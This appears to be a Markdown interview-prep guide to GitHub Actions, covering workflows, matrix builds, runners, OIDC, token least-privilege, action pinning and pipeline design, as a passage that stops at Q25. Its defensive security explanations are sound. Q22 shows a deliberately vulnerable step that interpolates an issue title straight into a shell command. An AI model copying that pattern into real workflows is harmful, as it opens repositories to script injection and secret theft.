# GitHub Actions

GitHub Actions is GitHub's native CI/CD and automation platform that runs event-driven workflows defined as YAML inside your repository. This guide covers the execution model, security model (OIDC, least-privilege tokens, action pinning), reusable abstractions, and real pipeline patterns through 2026.

[← Back to master index](../README.md)

## Table of Contents

- [🟢 Basic (0–2 yrs)](#-basic-02-yrs)
- [🟡 Intermediate (3–7 yrs)](#-intermediate-37-yrs)
- [🟠 Advanced (8–12 yrs)](#-advanced-812-yrs)
- [🔴 Expert (15+ yrs)](#-expert-15-yrs)
- [✅ Key Takeaways](#-key-takeaways)
- [⚠️ Common Pitfalls](#-common-pitfalls)
- [📚 Further Reading](#-further-reading)

---

## 🟢 Basic (0–2 yrs)

### Q1. [Theory] Explain the workflow → job → step model and where each runs.

GitHub Actions has a strict three-level hierarchy. A **workflow** is a YAML file in `.github/workflows/` that is triggered by an event. A workflow contains one or more **jobs**, and each job runs on a fresh **runner** (a VM or container). Jobs run in parallel by default and are isolated from one another — they do **not** share a filesystem or environment variables. A job contains an ordered list of **steps**; steps run sequentially on the *same* runner and *do* share the filesystem and the `$GITHUB_WORKSPACE`. A step either runs a shell command (`run:`) or invokes a reusable **action** (`uses:`).

The "why" of this design: jobs are the unit of parallelism and isolation (so you can fan out a build/test/lint matrix), while steps are the unit of sequential composition. Because jobs are isolated, anything you want to pass between them must go through **artifacts**, **job outputs**, or **caches** — not the filesystem.

```
Event (push, PR, schedule...)
   │
   ▼
┌─────────────────── Workflow (.github/workflows/ci.yml) ───────────────────┐
│                                                                            │
│   Job: build  ─────────┐         Job: test  ──────────┐  (parallel)        │
│   runner VM #1          │         runner VM #2          │                   │
│   ┌──────────────────┐  │         ┌──────────────────┐ │                   │
│   │ step1: checkout  │  │         │ step1: checkout  │ │                   │
│   │ step2: build     │  │         │ step2: pytest    │ │                   │
│   │ step3: upload    │  │         └──────────────────┘ │                   │
│   └──────────────────┘  │                              │                   │
│         shared FS       │  needs: build (sequential)   │                   │
└─────────────────────────┴──────────────────────────────┴───────────────────┘
```

### Q2. [Practical] Write a minimal CI workflow that runs tests on every push and PR to `main`.

Scenario: a Node project needs to install deps and run tests on each push to `main` and on every PR targeting `main`.

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'           # built-in dependency cache
      - run: npm ci              # reproducible install from lockfile
      - run: npm test
```

Trade-off note: `npm ci` (not `npm install`) is the production-correct choice because it installs exactly what the lockfile specifies and fails if `package.json` and `package-lock.json` are out of sync — deterministic builds matter more than convenience in CI.

### Q3. [Theory] What is the difference between `push`, `pull_request`, and `pull_request_target`?

`push` fires when commits land on a branch/tag. `pull_request` fires on PR activity (opened, synchronized, reopened) and is the standard event for validating contributions — crucially, for PRs from forks it runs with a **read-only** `GITHUB_TOKEN` and *no access to secrets*, which is a deliberate security boundary. `pull_request_target` is the dangerous sibling: it runs in the context of the **base** repository with full secrets and write token, but checks out untrusted PR code. Using `pull_request_target` and then checking out + executing the PR's code is a classic remote-code-execution vulnerability. Use `pull_request_target` only for safe metadata operations (labeling, welcome comments) and never to run untrusted build scripts.

### Q4. [Practical] How do you pass data between steps and between jobs?

Within a job, use `$GITHUB_OUTPUT` for step outputs and `$GITHUB_ENV` for env vars shared by later steps. Between jobs (isolated runners), use job-level `outputs` or upload/download artifacts.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=1.4.2" >> "$GITHUB_OUTPUT"   # step output
      - run: echo "Building ${{ steps.meta.outputs.version }}"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"  # cross-job
```

The `echo "x=y" >> "$GITHUB_OUTPUT"` syntax replaced the deprecated `::set-output` command (removed in 2023) for security reasons — the old command was vulnerable to log-injection.

---

## 🟡 Intermediate (3–7 yrs)

### Q5. [Coding] Build a matrix build that tests across multiple OSes and language versions, with one excluded combination.

**Problem:** Test a Python library on Ubuntu, Windows, and macOS across Python 3.10–3.13, but skip the (expensive, low-value) Windows + 3.10 combination, and allow experimental 3.14 builds to fail without failing the whole workflow.

```yaml
name: Matrix CI
on: [push, pull_request]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false          # don't cancel siblings on first failure
      max-parallel: 6
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        python: ['3.10', '3.11', '3.12', '3.13']
        include:
          - os: ubuntu-latest    # add one experimental combo
            python: '3.14'
            experimental: true
        exclude:
          - os: windows-latest
            python: '3.10'
    continue-on-error: ${{ matrix.experimental == true }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
      - run: pip install -e .[test]
      - run: pytest -q
```

**How it works:** The cartesian product is `3 OS × 4 Python = 12`, minus the 1 excluded combo, plus the 1 explicit `include` = **12 jobs**. `fail-fast: false` keeps all matrix legs running so you see *every* failure in one run (the default `true` cancels in-flight jobs on the first failure — faster feedback but less complete). `continue-on-error` gated on the `experimental` flag lets bleeding-edge builds report status without blocking the merge.

**Edge cases:** `include` entries that match an existing combination *extend* it (add keys) rather than create a new job; `include` entries with no overlap create new jobs. An empty matrix dimension produces zero jobs — guard generated matrices with a fallback.

**Complexity:** Number of jobs = O(product of dimension sizes). Watch the 256-job-per-matrix cap and your concurrent-runner quota.

### Q6. [Practical] Compare GitHub-hosted vs self-hosted runners. When would you choose each?

GitHub-hosted runners are ephemeral VMs that GitHub provisions, patches, and destroys per job — zero maintenance, clean state every run, and billed per minute. Self-hosted runners are machines *you* manage, useful when you need: GPUs/large memory, access to a private network/datacenter, special hardware or licensed software, or cheaper steady-state cost at high volume.

```
                    Hosted                          Self-hosted
Setup               none                            you install + register
State               fresh every job (secure)        persists unless ephemeral mode
Cost model          per-minute                      your infra (often cheaper at scale)
Network             public internet                 can reach private VPC/on-prem
Security risk       low                              HIGH on public repos (RCE)
Scaling             automatic                        you scale (ARC on K8s, ASGs)
```

Production guidance: **Never** attach a persistent self-hosted runner to a *public* repository — a fork PR can run arbitrary code and the persistent disk leaks secrets to the next job. For self-hosted at scale use **ephemeral, single-use** runners via Actions Runner Controller (ARC) on Kubernetes, which spins up a fresh pod per job. For most teams, hosted runners (now including larger runners and ARM options) are the right default; reach for self-hosted only when a concrete constraint forces it.

### Q7. [Theory] How does dependency caching differ from artifacts, and when do you use each?

**Caching** (`actions/cache`) is an optimization: it persists directories (e.g. `~/.npm`, `~/.m2`) keyed by a hash of the lockfile so the *next* run can skip re-downloading. A cache miss is not an error — the workflow proceeds and re-populates it. Caches are best-effort, scoped by branch (with fallback to the default branch), and subject to eviction and a per-repo size budget (~10 GB). **Artifacts** (`actions/upload-artifact` / `download-artifact`) are deliberate *outputs* of a workflow — build binaries, test reports, coverage — meant to be passed between jobs or downloaded by humans, with explicit retention. Rule of thumb: cache things you can *regenerate* (dependencies, build intermediates); use artifacts for things you want to *keep or hand off* (the built `.jar`, the SBOM, the HTML report). Never cache secrets, and remember v4 of both actions is required since the v1–v3 versions were deprecated/retired.

### Q8. [Coding] Write a composite action that sets up a toolchain, and call it from a workflow.

**Problem:** Three workflows repeat the same "checkout + setup Node + install + cache" preamble. Extract it into a reusable **composite action** to DRY it up.

```yaml
# .github/actions/setup-node-app/action.yml
name: 'Setup Node App'
description: 'Checkout, set up Node with cache, install deps'
inputs:
  node-version:
    description: 'Node version'
    required: false
    default: '20'
runs:
  using: 'composite'
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}
        cache: 'npm'
    - run: npm ci
      shell: bash          # shell is REQUIRED for run steps in composite actions
```

```yaml
# caller workflow
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/setup-node-app
        with:
          node-version: '22'
      - run: npm run build
```

**Key points:** every `run:` step in a composite action *must* declare `shell:`. Composite actions package *steps* and run inside an existing job (sharing the runner); they cannot define their own `runs-on` or matrix. Edge case: secrets are not auto-passed — expose them as inputs or read them inside the caller. **Complexity:** purely organizational; no runtime cost beyond the steps themselves.

### Q9. [Theory] What is a reusable workflow and how does it differ from a composite action?

A **reusable workflow** is a whole workflow file called from another workflow via `uses: owner/repo/.github/workflows/x.yml@ref` under a job (with `workflow_call` trigger). It packages **entire jobs** — including `runs-on`, multiple jobs, environments, and secrets-passing — whereas a composite action packages **steps within a single job**. Use a reusable workflow to standardize an org's *deployment pipeline* (multiple jobs, environment gates); use a composite action to standardize a *sequence of steps* (setup, lint). Reusable workflows support `secrets: inherit` and typed `inputs`/`outputs`, and can be nested up to four levels deep. The trade-off: reusable workflows give stronger governance (a platform team owns the deploy logic) at the cost of less flexibility than dropping raw steps into a job.

### Q10. [Practical] How do you prevent redundant or conflicting concurrent runs?

Use the `concurrency` key. The classic pattern cancels superseded PR builds to save minutes, while serializing deploys to an environment to prevent races.

```yaml
# Cancel older in-progress runs for the same PR/branch
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

```yaml
# Serialize production deploys (do NOT cancel mid-deploy)
concurrency:
  group: deploy-production
  cancel-in-progress: false
```

The mental model: a concurrency group allows only one running plus one pending run. `cancel-in-progress: true` is right for CI (newer commit obsoletes the old build); for deploys set it to `false` so an in-flight rollout finishes cleanly and the next deploy queues behind it — cancelling a half-finished deploy can leave infra in a broken state.

---

## 🟠 Advanced (8–12 yrs)

### Q11. [Theory] Explain OIDC federation to a cloud provider and why it beats long-lived secrets.

Traditional cloud auth in CI means storing a long-lived access key (e.g. AWS `AKIA...`) as a repository secret — a standing credential that, if leaked, is valid until manually rotated. **OIDC (OpenID Connect)** eliminates it. GitHub's OIDC provider mints a short-lived **JWT** for each job, signed by GitHub, containing claims like `repository`, `ref`, `environment`, and `workflow`. The cloud (AWS IAM, GCP Workload Identity, Azure AD) is configured to *trust* GitHub's issuer and to exchange that JWT for **temporary** credentials (~1 hour), scoped by an IAM role whose trust policy filters on those claims.

```
┌──────────────┐  1. request JWT   ┌─────────────────────┐
│  Actions job │ ────────────────▶ │ GitHub OIDC provider│
│ (id-token:   │ ◀──────────────── │ token.actions...    │
│   write)     │  2. signed JWT     └─────────────────────┘
│              │       claims: repo, ref, environment, sub
│              │  3. AssumeRoleWithWebIdentity(JWT)
│              │ ───────────────────────────────▶ ┌──────────────┐
│              │ ◀─────────────────────────────── │ AWS STS / IAM│
└──────────────┘  4. temp creds (15m–1h)          │ trust policy │
                                                    │ checks `sub` │
                                                    └──────────────┘
```

Why it wins: no secret to leak or rotate; credentials expire in minutes; and the IAM trust policy can pin access to a *specific repo, branch, and environment* (e.g. only `repo:org/app:environment:production` can touch prod). The critical security pitfall is a sloppy trust-policy `sub` condition — using a wildcard like `repo:org/*:*` lets *any* workflow in the org assume the role. Always pin the `sub` to exact `repository` + `ref`/`environment`.

```yaml
permissions:
  id-token: write     # REQUIRED to request the OIDC JWT
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: us-east-1
          # NO aws-access-key-id / secret — OIDC handles it
      - run: aws s3 sync ./dist s3://my-bucket
```

### Q12. [Practical] How do you secure the `GITHUB_TOKEN` and third-party actions in a hardened pipeline?

Two attack surfaces: the token's blast radius and supply-chain risk from actions.

**Least-privilege token:** Set the org/repo default to read-only, then grant per-workflow/per-job. The `GITHUB_TOKEN` is auto-generated, scoped to the repo, and expires at job end — but by default it can be over-privileged.

```yaml
permissions:            # workflow-wide floor; can also set per-job
  contents: read        # deny-by-default everything else
jobs:
  release:
    permissions:
      contents: write   # only this job can push tags/releases
      packages: write
```

**Pin actions by full commit SHA**, not a tag. Tags are mutable — an attacker who compromises an action repo can re-point `@v4` to malicious code (this is exactly the class of attack behind the 2025 `tj-actions/changed-files` supply-chain incident, where a popular action's tags were rewritten to exfiltrate secrets from thousands of repos). SHA pinning makes the reference immutable.

```yaml
# Mutable — risky:
- uses: actions/checkout@v4
# Immutable — hardened (comment keeps it readable):
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

Production hardening checklist: SHA-pin all third-party actions (Dependabot can still bump them while keeping SHAs); restrict allowed actions via org policy to verified creators or an allowlist; never `echo` secrets or interpolate untrusted input directly into `run:` scripts (use intermediate env vars to avoid script injection); and enable secret scanning + push protection.

### Q13. [Coding] Write a job that builds a multi-arch Docker image and pushes it to GHCR using OIDC-free token auth, with build caching.

**Problem:** Build a linux/amd64 + linux/arm64 image, tag it from git metadata, push to GitHub Container Registry, and cache layers between runs.

```yaml
name: Build & Push Image
on:
  push:
    branches: [main]
    tags: ['v*']

permissions:
  contents: read
  packages: write        # needed to push to GHCR

jobs:
  docker:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: docker/setup-qemu-action@v3      # emulation for arm64
      - uses: docker/setup-buildx-action@v3    # BuildKit builder

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}   # repo-scoped, auto-rotated

      - id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=semver,pattern={{version}}
            type=sha,prefix=sha-
            type=raw,value=latest,enable={{is_default_branch}}

      - uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha               # GitHub Actions layer cache
          cache-to: type=gha,mode=max
          provenance: true                    # SLSA build provenance attestation
```

**Notes:** `mode=max` caches *all* layers (including intermediate build stages), not just the final image, maximizing reuse at the cost of cache size. `provenance: true` emits a signed SLSA provenance attestation — increasingly required for supply-chain compliance in 2026. **Edge case:** arm64 emulation via QEMU is slow; for hot paths use a native arm64 runner instead. **Complexity:** wall-clock build time drops from O(full rebuild) toward O(changed layers) on cache hits.

### Q14. [Practical] How do you implement environments with manual approvals and protection rules?

GitHub **Environments** are named deployment targets (`staging`, `production`) that carry their own secrets, protection rules, and deployment history. The key governance feature is **required reviewers**: a job targeting a protected environment *pauses* and waits for a designated person/team to approve before it runs — giving you a manual gate without external tooling.

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production              # configured in repo Settings → Environments
      url: https://app.example.com  # surfaced in the UI after deploy
    steps:
      - run: ./deploy.sh prod
```

In the environment settings you configure: **required reviewers** (manual approval), a **wait timer** (forced delay, e.g. canary soak), **deployment branch policy** (only `main` or `release/*` may deploy to prod), and **environment-scoped secrets/variables** (so prod creds never exist in the staging job). Trade-off: approvals add human latency but are the simplest robust guardrail for regulated/production changes. Combine with OIDC trust policies that filter on `environment:production` so the *cloud* also enforces that only the prod environment can assume the prod role — defense in depth at both the GitHub and IAM layers.

### Q15. [Theory] What happens during a fork PR, and how does that shape your security posture?

When an external contributor opens a PR from a fork, the `pull_request` event runs the workflow **without access to secrets** and with a **read-only** `GITHUB_TOKEN`. This is intentional: untrusted code must not be able to read your deploy keys or push to your repo. Consequences for design: secret-dependent steps (publishing, deploying, posting authenticated comments) will silently lack credentials on fork PRs, so split your pipeline — run untrusted build/test on `pull_request`, and gate anything privileged behind `push` to a protected branch, a protected `environment`, or the `workflow_run` event triggered after the PR merges. Avoid `pull_request_target` for anything that executes PR code. For workflows that genuinely need a privileged step on a fork PR (rare), use the manual-approval pattern: the first-time-contributor approval gate plus an environment reviewer means a maintainer eyeballs the diff before any trusted step runs.

---

## 🔴 Expert (15+ yrs)

### Q16. [Theory] You're standardizing CI/CD across 400 repos in a large org. Design the governance architecture.

The goal is *centralized control with decentralized usage*. Build a small set of **org-owned reusable workflows** in a dedicated `org/.github-workflows` repo that encode the golden path: build, scan, sign, deploy. Individual repos call them with a few inputs, so security and compliance logic lives in *one* audited place rather than 400 copy-pasted YAMLs.

```
┌────────────────────────────────────────────────────────────┐
│  org/ci-platform (owned by platform team, branch-protected) │
│   reusable: build.yml, security-scan.yml, deploy.yml        │
│   composite: setup-toolchain, sbom-generate                 │
└───────────────┬────────────────────────────────────────────┘
                │ uses: org/ci-platform/.github/workflows/deploy.yml@<sha>
   ┌────────────┼────────────┬───────────────┐
   ▼            ▼            ▼               ▼
 repo-A       repo-B       repo-C   ...    repo-N   (thin caller workflows)
```

Controls layered on top: an org-level **allowed-actions policy** (verified creators + explicit allowlist, all SHA-pinned, auto-updated by Dependabot); **default read-only** `GITHUB_TOKEN` org-wide; **OIDC** to cloud with environment-scoped trust policies (no static keys anywhere); **required reviewers** on production environments and CODEOWNERS on the platform repo; and **rulesets** enforcing required status checks before merge. Trade-offs: reusable workflows reduce flexibility and can become a bottleneck if the platform team is understaffed, so expose enough inputs for the common 80% and provide an escape hatch (a documented "raw" mode) for the 20%. Measure adoption and DORA metrics centrally to prove the platform's value.

### Q17. [Practical] A deploy job intermittently fails with expired credentials mid-run. Diagnose and fix.

**Symptom → hypotheses → fix.** Intermittent "credentials expired" on long deploys almost always means the *short-lived* token's lifetime is shorter than the deploy. With OIDC, the assumed-role session defaults to ~1 hour but can be shorter if the IAM role's `MaxSessionDuration` is capped lower, or if the deploy genuinely exceeds the session window (large migrations, slow rollouts). I'd first confirm by correlating failure timestamps with job start time — failures clustering near the ~60-minute mark confirm session expiry.

Fixes, in order of preference: (1) raise the IAM role's `MaxSessionDuration` and request a longer session in `configure-aws-credentials`; (2) **re-acquire credentials closer to the long operation** — assume the role again right before the slow step rather than at job start; (3) split the monolithic deploy into smaller jobs so each gets a fresh token; (4) for truly long-running operations, fire-and-poll: kick off the operation and use a separate short job to poll status rather than holding one session open. I'd also add explicit retry-with-backoff around the cloud calls so a transient STS hiccup doesn't fail the whole pipeline, and emit the token's `exp` claim to logs (not the token itself) for future diagnosis. The anti-pattern to avoid is "just go back to a static key so it never expires" — that re-introduces the exact standing-credential risk OIDC removed.

### Q18. [Behavioral] Tell me about a time you had to balance developer velocity against pipeline security/governance.

Use a STAR structure. **Situation:** developers were SHA-pinning actions manually, found it painful, and started pasting mutable tags back in to move faster — eroding our supply-chain posture. **Task:** keep the immutability guarantee without making developers do tedious SHA lookups. **Action:** I reframed the trade-off rather than mandating compliance. We adopted Dependabot configured to update action SHAs automatically (keeping the human-readable version in a trailing comment), added a lightweight CI check that *rejected* mutable action references, and moved the most-used setup steps into an org composite action so most repos referenced *our* pinned action instead of dozens of third-party ones. **Result:** SHA-pinning compliance went from ~40% to near-100% with *less* developer effort than before, because the friction moved into automation. **Reflection:** the lesson is that security controls that fight developer velocity get circumvented; the durable fix is to make the secure path the *easy* path. I now treat "is this control self-service and automated?" as a first-class design requirement, not an afterthought.

### Q19. [Theory] Compare GitHub Actions with Jenkins, GitLab CI, and Argo CD for a platform decision.

```
                 GitHub Actions      Jenkins            GitLab CI         Argo CD
Model            event-driven YAML   plugin/Groovy      YAML pipelines    GitOps (CD only)
Hosting          SaaS + self-host    self-host          SaaS + self-host  in-cluster
Maintenance      low                 high (plugins)     medium            medium
Ecosystem        Marketplace         huge plugin set    built-in DevOps   K8s-native
Best at          GitHub-centric CI   bespoke/legacy     all-in-one DevOps continuous deploy
Secrets/cloud    OIDC native         plugin-dependent   OIDC supported    sealed/external
```

The honest framing: Actions is the strongest choice when your code already lives on GitHub and you want tight PR integration, a large marketplace, and native OIDC with minimal ops burden. Jenkins still wins for highly customized, on-prem, or legacy pipelines where its plugin breadth and full programmability matter — at the cost of significant maintenance and a larger attack surface. GitLab CI is compelling if you want a single integrated DevOps platform. Argo CD isn't a competitor but a complement: a common 2026 pattern is **Actions for CI** (build, test, sign, push image + update a manifest) and **Argo CD for CD** (pull-based GitOps reconciliation into Kubernetes). The trade-off to articulate in an interview is push-based deploy (Actions runs `kubectl apply`) vs pull-based GitOps (Argo reconciles desired state) — pull-based gives drift detection and a cleaner audit trail but adds a component.

### Q20. [Coding] Design a complete CI/CD pipeline: test → build/sign image → deploy to staging → gated production via OIDC.

**Problem:** A production-grade pipeline that runs tests, builds and pushes a signed image to GHCR, deploys to staging automatically, then deploys to production only after manual approval — all using OIDC (no static cloud keys) and least-privilege tokens.

```yaml
name: CI/CD
on:
  push:
    branches: [main]

permissions:
  contents: read        # safe default for the whole workflow

concurrency:
  group: cicd-${{ github.ref }}
  cancel-in-progress: false   # don't cancel an in-flight deploy

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }
      - run: npm ci
      - run: npm test -- --coverage

  build:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write          # for keyless signing (cosign/Sigstore)
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          provenance: true
      - uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    permissions:
      id-token: write           # OIDC to cloud
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::111122223333:role/gha-staging
          aws-region: us-east-1
      - run: ./deploy.sh staging ghcr.io/${{ github.repository }}@${{ needs.build.outputs.digest }}

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production          # protected: required reviewers gate this job
      url: https://app.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::444455556666:role/gha-production
          aws-region: us-east-1
      - run: ./deploy.sh production ghcr.io/${{ github.repository }}@${{ needs.build.outputs.digest }}
```

```
test ──▶ build (sign + provenance) ──▶ deploy-staging ──▶ [⏸ approval] ──▶ deploy-production
 │            │                              │ env: staging      │ env: production
 npm test     cosign keyless (OIDC)          OIDC→staging role   OIDC→prod role + reviewer gate
```

**Why this is production-correct:** the image is referenced by **immutable digest** (`@sha256:...`), not a mutable tag, so staging and prod deploy the *exact* artifact that was tested and signed. Each environment assumes a *separate* IAM role with a trust policy filtered on its environment claim, so a compromise of staging can't touch prod. The `production` environment's required-reviewer rule turns `deploy-production` into a manual gate. **Edge cases:** if `build` fails, neither deploy runs (`needs`); concurrency with `cancel-in-progress: false` queues a newer commit behind an in-flight deploy rather than aborting it. **Complexity:** the pipeline is mostly I/O-bound; the long pole is the build (mitigated by layer caching) and human approval latency before prod.

---

## 🧩 Extended Questions — Set 1: Deep Theory & Internals

### 🟢 Basic — extended

#### Q21. [Theory] What is the difference between `run` and `uses`, and what does each actually execute on the runner?

`run` and `uses` are the two mutually exclusive things a *step* can do, and they sit at very different layers of abstraction. A `run` step hands a string to a shell process on the runner (`bash` on Linux/macOS, `pwsh` on Windows by default) — the runner writes your script to a temp file, invokes the shell with it, and the step's exit code is the shell's exit code. A `uses` step instead references a packaged **action**: a unit of reusable logic identified by a path (`./local`), a repo+ref (`owner/repo@sha`), or a Docker image (`docker://image:tag`).

The deeper point is that `uses` is not one thing — there are three action "flavours" and the runner executes each differently. A **JavaScript action** runs via Node directly on the runner host (fast, cross-platform). A **Docker container action** builds/pulls an image and runs your code inside a container the runner starts (Linux-only, heavier, but full control of the toolchain). A **composite action** is just a bundle of `run`/`uses` steps that get spliced into the calling job inline.

```
step "uses:"          how the runner executes it
─────────────────     ────────────────────────────────────────────
owner/repo@sha (JS)   node <action>/dist/index.js  (host process)
owner/repo@sha (comp) inlines the action's steps into this job
docker://img / Docker docker run img  (containerized, Linux only)
./path                local action in the checked-out repo
```

The practical consequence: a `run` step is the right tool for "do this shell command here"; a `uses` step is right for "invoke a tested, parameterized capability." Mixing them up — e.g. shelling out to reimplement what `actions/setup-node` does — loses caching, cross-platform handling, and version management that the action already solved.

#### Q22. [Theory] How does `${{ }}` expression evaluation actually work, and when in the lifecycle is each expression resolved?

`${{ }}` is GitHub's expression syntax, and the single most misunderstood thing about it is **when** it is evaluated. Most expressions are interpolated by the *runner* (or the workflow orchestrator) into a literal string *before* the shell ever sees the step. So `run: echo "${{ github.event.issue.title }}"` does not pass a variable to the shell — it textually substitutes the issue title into your script, which is exactly why it is a script-injection vector. The shell receives already-expanded text; there is no quoting boundary protecting you.

Different contexts become available at different lifecycle moments, which is why some expressions work in one place and silently evaluate to empty elsewhere. `github`, `inputs`, and `vars` are known at workflow parse time. `env` is layered (workflow → job → step). `needs` is only populated once upstream jobs finish. `steps.<id>.outputs` only exists after that step runs. `secrets` and `matrix` are resolved by the orchestrator before the job dispatches.

```
Parse workflow ──▶ resolve job-level if/strategy (github, vars, inputs)
        │
        ▼
Dispatch job ────▶ matrix + secrets injected
        │
        ▼
Run step N ──────▶ env + steps.<prior>.outputs available; ${{ }} expanded
                  into the step BEFORE shell executes
```

A subtle corollary: because job-level keys like `if:`, `strategy`, and `runs-on` are evaluated before any step runs, you cannot reference a step output in them. You also cannot reference `secrets` inside `if:` at the job level in some contexts — the safe pattern is to copy a secret into an output or env at runtime and branch on that. Understanding the timeline is what separates "why is this `${{ }}` empty?" guesswork from a precise answer.

#### Q23. [Theory] What exactly is the `GITHUB_TOKEN`, where does it come from, and what is its lifecycle?

The `GITHUB_TOKEN` is not a secret you create — it is an **installation access token for a GitHub App** that GitHub automatically provisions for each workflow run. At the start of a run, GitHub mints a token scoped to *that repository*, with permissions derived from the `permissions:` block (or the repo/org default), and injects it as `secrets.GITHUB_TOKEN` (and as the credential `actions/checkout` uses). When the job finishes, the token is **revoked** — it is useless afterward, which is why it can't leak into long-term standing access the way a PAT can.

The "App installation token" framing explains several behaviours that confuse people. First, events triggered *by* the `GITHUB_TOKEN` do **not** trigger further workflow runs — this is a deliberate loop-breaker (a workflow that pushes a commit won't infinitely re-trigger itself on `push`). If you genuinely need a token-pushed commit to trigger CI, you must use a PAT or a separate App. Second, the token's actor is `github-actions[bot]`, not the human who pushed, which is why bot-authored PRs and comments show up under that identity.

```
run start ──▶ mint installation token (scoped to repo, perms from permissions:)
   │             │
   │             ├─ checkout uses it as the git credential
   │             ├─ gh / API calls authenticate with it
   │             └─ events it causes do NOT re-trigger workflows
   ▼
run end ────▶ token revoked (≤ run duration, ~ up to 24h hard cap)
```

The lifecycle is the security story: short-lived, auto-rotated, repo-scoped, default-denied-extra-scopes when you set `permissions: read-all` or tighter. The interview-worthy nuance is knowing it is an *App* token, not a PAT — that single fact predicts the no-recursive-trigger rule, the bot identity, and why it can't reach other repos without explicit configuration.

#### Q24. [Theory] What is the difference between `${{ env.X }}`, repository variables (`vars`), and secrets — and how do they differ in scope and masking?

These three look similar but differ along two axes: **scope/precedence** and **confidentiality**. `env` is plain configuration defined inline at workflow, job, or step level, with the innermost level winning; it lives in the YAML or is set at runtime via `$GITHUB_ENV`. `vars` (repository/organization/environment *variables*) are non-secret values configured in settings and shared across many workflows — the same idea as `env` but managed centrally and not redefined per file. `secrets` are confidential values that the runner **masks** in logs (any exact match of the secret string is replaced with `***`).

The masking behaviour is where deep understanding shows. Masking is a naive string replacement on the secret's literal value — so if your secret is the single character `1` or a common word, the logs become a mess of `***`, and if you *transform* a secret (base64-decode it, slice it) the transformed value is **not** masked because it no longer matches the registered string. That is a real exfiltration risk and why you should register derived values with `::add-mask::` or avoid logging them at all.

```
                 env / vars              secrets
Confidential     no                      yes (masked in logs)
Scope            wf/job/step (env)       repo / org / environment
                 repo/org/env (vars)
Set at runtime   $GITHUB_ENV (env only)  no (configured ahead of time)
Available to     all contexts            NOT on fork PRs by default
Masking          none                    exact-string match only
```

Precedence-wise, environment-scoped secrets/variables override repo-scoped ones override org-scoped ones, so a `production` environment can shadow an org default. The practical rule: use `vars` for non-sensitive config you want centralized, `env` for per-workflow wiring, and `secrets` only for true credentials — and never assume a *derived* form of a secret stays masked.

### 🟡 Intermediate — extended

#### Q25. [Theory] Walk through the full lifecycle of a job from event to runner teardown. What happens under the hood?

A job's life starts long before the runner sees it. An **event** (webhook, schedule tick, API dispatch) reaches GitHub; GitHub's Actions service evaluates which workflows match the event and their `on`/path/branch filters, then *parses* each matching workflow and builds a job graph from `needs`. Jobs with satisfied dependencies and passing `if:` conditions become eligible to dispatch. Matrix expansion happens here too — one job definition explodes into N concrete jobs.

Dispatch means the job is placed on a queue for a runner that matches its `runs-on` labels. A **runner** (the self-hosted agent process, or GitHub's ephemeral VM) polls for work, claims the job, and receives the job's plan: the ordered steps, the secrets it's allowed, and the freshly-minted `GITHUB_TOKEN`. The runner sets up the workspace, then executes steps sequentially — for each step it expands `${{ }}`, runs pre/main/post hooks (actions can have `pre:` and `post:` phases, which is how `setup-node` saves caches *after* your steps), and records exit codes.

```
Event ─▶ match workflows ─▶ parse + build job graph (needs, if, matrix)
                                        │
                                        ▼
                              dispatch eligible jobs to queue
                                        │  (runs-on labels)
                                        ▼
        Runner polls ─▶ claims job ─▶ receives plan + token + allowed secrets
                                        │
              ┌─────────────────────────┘
              ▼
        for each step: expand ${{ }} ─▶ pre ─▶ main ─▶ (post in reverse order)
              │
              ▼
        report status ─▶ token revoked ─▶ (hosted) VM destroyed
```

